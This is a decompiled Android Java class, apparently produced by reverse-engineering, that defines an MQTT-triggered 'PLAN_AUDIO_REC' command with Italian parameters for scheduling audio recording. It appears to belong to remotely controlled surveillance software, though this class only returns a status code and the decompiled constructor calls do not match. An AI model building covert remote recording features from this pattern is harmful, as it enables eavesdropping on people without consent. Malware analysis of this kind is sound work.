package com.app.system.common.commands;

import android.content.Context;
import com.app.system.mqtt.MqttCommand;
import com.app.system.mqtt.MqttCommandReply;
import java.text.SimpleDateFormat;
import java.util.Date;

public class PlanAudioRec
  extends Command
{
  public static final String CMD_NAME = "PLAN_AUDIO_REC";
  private static final SimpleDateFormat DF = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
  public static final int MAX_DURATION = 1800;
  public static final int MIN_DURATION = 10;
  public static final String PARAM_DURATION = "DURATA";
  public static final String PARAM_START_TIME = "DATA_ORA";
  public static Command.Factory sFactory = new Command.Factory()
  {
    public Command a(MqttCommand paramAnonymousMqttCommand)
    {
      return new PlanAudioRec(paramAnonymousMqttCommand, null);
    }
  };
  private int duration;
  private String errorText;
  private Date startTime;
  
  private PlanAudioRec(MqttCommand paramMqttCommand)
  {
    super(paramMqttCommand);
  }
  
  public MqttCommandReply a(Context paramContext)
  {
    paramContext = this.mqttCmd.b(paramContext);
    paramContext.result = 320;
    paramContext.replyText = MqttCommandReply.a(320);
    return paramContext;
  }
}


/* Location:              ~/com/app/system/common/commands/PlanAudioRec.class
 *
 * Reversed by:           J
 */